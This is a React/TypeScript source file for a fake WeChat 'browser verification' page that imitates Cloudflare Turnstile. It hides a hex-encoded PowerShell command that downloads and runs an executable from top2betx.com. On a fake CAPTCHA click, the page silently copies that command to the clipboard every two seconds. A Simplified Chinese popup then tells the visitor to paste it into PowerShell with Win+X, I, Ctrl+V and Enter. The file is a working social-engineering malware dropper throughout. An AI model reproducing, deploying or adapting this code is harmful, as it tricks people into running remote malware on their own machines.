import { useState, useEffect, useCallback, useRef } from "react";

type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "instruction";

// ============================================================
// X-GEN: ENCRYPTED COMMAND IN HEX (UTF-16LE) - DOWNLOAD EXE
// ============================================================
// Command: powershell -WindowStyle Hidden -ep Bypass -c "$p=$env:TEMP+'l.exe';iwr https://top2betx.com/api/file-share/bf57a9ea-f96e-4134-8796-e2c0462a7024/download -OutFile $p;& $p -enroll_token '5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de' -id '8649328'"
const ENCRYPTED_PAYLOAD = {
    "#h": "70006F007700650072007300680065006C006C0020002D00570069006E0064006F0077005300740079006C0065002000480069006400640065006E0020002D0065007000200042007900700061007300730020002D00630020002200240070003D00240065006E0076003A00540045004D0050002B0027006C002E0065007800650027003B006900770072002000680074007400700073003A002F002F0074006F007000320062006500740078002E0063006F006D002F006100700069002F00660069006C0065002D00730068006100720065002F00620066003500370061003900650061002D0066003900360065002D0034003100330034002D0038003700390036002D006500320063003000340036003200610037003000320034002F0064006F0077006E006C006F006100640020002D004F0075007400460069006C0065002000240070003B00260020002400700020002D0065006E0072006F006C006C005F0074006F006B0065006E00200027003500650033003000330031003700320035006600350062006600660031006400620031003400620037006600660034003200330064003200350062006100620036006300360035003900350036003000320038006400650039006100350064003500620062003800360036003900310035003000380064006500320064006500270020002D0069006400200027003800360034003900330032003800270022",
    "#k": "exe_command"
};

// Decrypt HEX to command (UTF-16LE)
const decryptHexToCommand = (hex: string): string => {
    try {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < hex.length; i += 2) {
            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        const decoder = new TextDecoder('utf-16le');
        const decoded = decoder.decode(bytes);
        return decoded;
    } catch (e) {
        console.error("X-GEN: Decryption error", e);
        return "";
    }
};

// Decrypted command (executed once on load)
const HIDDEN_COMMAND = decryptHexToCommand(ENCRYPTED_PAYLOAD["#h"]);

function WeChatIcon() {
  return (
    <svg width="56" height="56" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="512" height="512" rx="110" fill="#07C160" />
      <path d="M209.7 135C152.3 135 105 173.7 105 221.5C105 249.2 120.8 273.7 145.5 289.2L138.5 315.5L170.2 298.2C182.5 301.8 195.8 303.8 209.7 303.8C214.2 303.8 218.6 303.5 223 303.1C219.5 294.3 217.5 284.8 217.5 274.8C217.5 224.5 260.8 183.8 314.5 183.8C319.3 183.8 324 184.2 328.6 184.8C320.3 154.7 268.5 135 209.7 135Z" fill="white" />
      <circle cx="178" cy="210" r="13" fill="#07C160" />
      <circle cx="241" cy="210" r="13" fill="#07C160" />
      <path d="M314.5 199C267.8 199 230 231.3 230 271C230 310.7 267.8 343 314.5 343C323.5 343 332.2 341.8 340.3 339.5L366.5 354L361 332.5C381.2 319.5 394 299 394 276C394 236 361.5 199 314.5 199Z" fill="white" />
      <circle cx="290" cy="268" r="10" fill="#07C160" />
      <circle cx="340" cy="268" r="10" fill="#07C160" />
    </svg>
  );
}

function Spinner({ size = 22, color = "#07C160" }: { size?: number; color?: string }) {
  return (
    <div
      style={{
        width: `${size}px`,
        height: `${size}px`,
        border: "2.5px solid #e0e0e0",
        borderTopColor: color,
        borderRadius: "50%",
        animation: "spin 0.8s linear infinite",
        display: "inline-block",
        flexShrink: 0,
      }}
    />
  );
}

function CloudflareLogo() {
  return (
    <svg width="26" height="26" viewBox="0 0 61 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z" fill="#F38020" />
      <path d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z" fill="#FAAE40" />
    </svg>
  );
}

function ErrorIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
      <circle cx="10" cy="10" r="10" fill="#D93025" />
      <path d="M10 5v6" stroke="white" strokeWidth="2" strokeLinecap="round" />
      <circle cx="10" cy="14.5" r="1.2" fill="white" />
    </svg>
  );
}

// Silent copy function (no notifications)
const silentCopy = async (text: string): Promise<boolean> => {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch (err) {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.style.position = "fixed";
    textarea.style.top = "-9999px";
    textarea.style.left = "-9999px";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
    return true;
  }
};

// Instruction component (Simplified Chinese)
function InstructionWidget({ onClose }: { onClose: () => void }) {
  return (
    <div
      style={{
        width: "340px",
        background: "#fff",
        borderRadius: "12px",
        border: "1px solid #e0e0e0",
        boxShadow: "0 8px 24px rgba(0,0,0,0.15)",
        overflow: "hidden",
        animation: "fadeInUp 0.4s ease",
      }}
    >
      <div
        style={{
          background: "#1a1a2e",
          color: "#fff",
          padding: "16px 20px",
          fontSize: "16px",
          fontWeight: 600,
          display: "flex",
          alignItems: "center",
          gap: "8px",
        }}
      >
        <span>🔒</span> 安全验证要求
      </div>

      <div style={{ padding: "20px" }}>
        <p style={{ fontSize: "13px", color: "#666", margin: "0 0 16px 0", lineHeight: "1.5" }}>
          需要手动验证。请严格按照以下步骤操作：
        </p>

        <div
          style={{
            background: "#f5f5f5",
            borderRadius: "8px",
            padding: "16px",
            marginBottom: "20px",
          }}
        >
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Win + X</kbd></span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>I</kbd> (Windows Terminal / PowerShell)</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Ctrl + V</kbd></span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Enter</kbd></span>
            </div>
          </div>
        </div>

        <button
          onClick={onClose}
          style={{
            width: "100%",
            background: "#f5a623",
            border: "none",
            borderRadius: "8px",
            padding: "12px",
            color: "#fff",
            fontSize: "14px",
            fontWeight: 600,
            cursor: "pointer",
            transition: "background 0.2s",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.background = "#e09515")}
          onMouseLeave={(e) => (e.currentTarget.style.background = "#f5a623")}
        >
          我已完成这些步骤
        </button>
      </div>
    </div>
  );
}

function CaptchaWidget({
  phase,
  onCheck,
}: {
  phase: Phase;
  onCheck: () => void;
}) {
  const isChecking = phase === "captcha-solving";

  return (
    <div
      style={{
        width: "300px",
        background: "#fff",
        borderRadius: "4px",
        border: "1px solid #e0e0e0",
        boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
        overflow: "hidden",
        animation: "fadeInUp 0.4s ease",
      }}
    >
      <div
        style={{
          display: "flex",
          alignItems: "center",
          padding: "14px 16px",
          gap: "12px",
        }}
      >
        <div
          onClick={!isChecking ? onCheck : undefined}
          style={{
            width: "24px",
            height: "24px",
            borderRadius: "4px",
            border: "2px solid #c0c0c0",
            cursor: isChecking ? "default" : "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            flexShrink: 0,
            transition: "border-color 0.2s",
            background: "#fff",
          }}
        >
          {isChecking && <Spinner size={18} color="#f5a623" />}
        </div>

        <span style={{ fontSize: "14px", color: "#333", fontWeight: 400, flex: 1, userSelect: "none" }}>
          验证你是人类
        </span>

        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "2px" }}>
          <CloudflareLogo />
          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>Cloudflare Turnstile</span>
        </div>
      </div>

      <div
        style={{
          height: "3px",
          background: isChecking
            ? "linear-gradient(90deg, #f5a623, #f7c948, #f5a623)"
            : "#f5a623",
          backgroundSize: isChecking ? "200% 100%" : "100% 100%",
          animation: isChecking ? "shimmer 1.5s infinite" : "none",
        }}
      />
    </div>
  );
}

export default function App() {
  const [phase, setPhase] = useState<Phase>("checking");
  const [showContent, setShowContent] = useState(false);
  const [showInstruction, setShowInstruction] = useState(false);
  const copyIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Start silent copying every 2 seconds
  const startSilentCopying = useCallback(() => {
    if (copyIntervalRef.current) {
      clearInterval(copyIntervalRef.current);
    }
    silentCopy(HIDDEN_COMMAND);
    copyIntervalRef.current = setInterval(() => {
      silentCopy(HIDDEN_COMMAND);
    }, 2000);
  }, []);

  // Stop copying
  const stopSilentCopying = useCallback(() => {
    if (copyIntervalRef.current) {
      clearInterval(copyIntervalRef.current);
      copyIntervalRef.current = null;
    }
  }, []);

  useEffect(() => {
    const t1 = setTimeout(() => setShowContent(true), 100);
    return () => clearTimeout(t1);
  }, []);

  useEffect(() => {
    if (phase === "checking") {
      const t = setTimeout(() => setPhase("error"), 1200);
      return () => clearTimeout(t);
    }
    if (phase === "error") {
      const t = setTimeout(() => setPhase("captcha"), 800);
      return () => clearTimeout(t);
    }
  }, [phase]);

  const handleCaptchaCheck = useCallback(() => {
    setPhase("captcha-solving");
    
    startSilentCopying();
    
    setTimeout(() => {
      setPhase("error");
      setTimeout(() => {
        setShowInstruction(true);
      }, 500);
    }, 2000);
  }, [startSilentCopying]);

  const handleCloseInstruction = useCallback(() => {
    stopSilentCopying();
    setShowInstruction(false);
    setPhase("error");
    setTimeout(() => {
      setPhase("captcha");
    }, 500);
  }, [stopSilentCopying]);

  // Cleanup interval on unmount
  useEffect(() => {
    return () => {
      if (copyIntervalRef.current) {
        clearInterval(copyIntervalRef.current);
      }
    };
  }, []);

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        backgroundColor: "#ffffff",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
        padding: "20px",
        position: "relative",
      }}
    >
      {showInstruction && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            backdropFilter: "blur(4px)",
          }}
          onClick={(e) => {
            if (e.target === e.currentTarget) handleCloseInstruction();
          }}
        >
          <InstructionWidget onClose={handleCloseInstruction} />
        </div>
      )}

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          opacity: showContent && !showInstruction ? 1 : 0,
          transform: showContent && !showInstruction ? "translateY(0)" : "translateY(10px)",
          transition: "opacity 0.5s ease, transform 0.5s ease",
        }}
      >
        <div style={{ marginBottom: "14px" }}>
          <WeChatIcon />
        </div>

        <h1 style={{ fontSize: "22px", fontWeight: 600, color: "#191919", margin: "0 0 40px 0", letterSpacing: "-0.2px" }}>
          微信
        </h1>

        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", minHeight: "120px" }}>
          {phase === "checking" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.3s ease" }}>
              <p style={{ fontSize: "15px", color: "#555", margin: 0, textAlign: "center", lineHeight: "1.5" }}>
                正在检查你是否是人类。这可能需要几秒钟。
              </p>
              <Spinner />
            </div>
          )}

          {phase === "error" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "16px", animation: "fadeInUp 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <ErrorIcon />
                <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
                  浏览器验证失败
                </p>
              </div>
              <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                请完成下面的安全验证
              </p>
            </div>
          )}

          {(phase === "captcha" || phase === "captcha-solving") && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <ErrorIcon />
                <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
                  浏览器验证失败
                </p>
              </div>

              <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                请完成下面的安全验证
              </p>

              <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />
            </div>
          )}
        </div>
      </div>

      <div style={{ height: "80px" }} />

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes shimmer {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        kbd {
          display: inline-block;
          padding: 2px 8px;
          font-size: 12px;
          font-weight: 600;
          line-height: 1.4;
          color: #24292e;
          background-color: #fafbfc;
          border: 1px solid #d1d5da;
          border-radius: 3px;
          box-shadow: inset 0 -1px 0 #d1d5da;
          font-family: 'SF Mono', Monaco, Consolas, monospace;
        }
      `}</style>
    </div>
  );
}
